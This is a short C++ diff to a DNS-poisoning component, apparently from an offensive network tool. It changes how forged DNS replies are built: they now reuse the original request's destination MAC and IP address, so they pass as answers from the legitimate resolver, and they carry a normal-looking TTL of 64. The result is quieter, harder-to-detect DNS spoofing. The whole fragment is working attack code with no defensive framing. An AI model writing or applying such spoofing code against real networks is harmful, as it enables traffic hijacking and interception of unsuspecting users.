@@ -62,10 +62,13 @@ void ATK::DNS::SilentDnsPoisoningStrategy::onPacketArrives(
     }
 
     // Build spoofed response
-    pcpp::EthLayer ethResponse(device->getMacAddress(),
+    pcpp::EthLayer ethResponse(requestEthLayer->getDestMac(),
                                requestEthLayer->getSourceMac());
-    pcpp::IPv4Layer ipResponse(device->getIPv4Address(),
+    pcpp::IPv4Layer ipResponse(requestIpLayer->getDstIPv4Address(),
                                requestIpLayer->getSrcIPv4Address());
+    const int ipTTL = 64;
+    ipResponse.getIPv4Header()->timeToLive = ipTTL;
+
     pcpp::UdpLayer udpResponse(DNS_PORT, requestUdpLayer->getSrcPort());
 
     pcpp::DnsLayer dnsResponse;
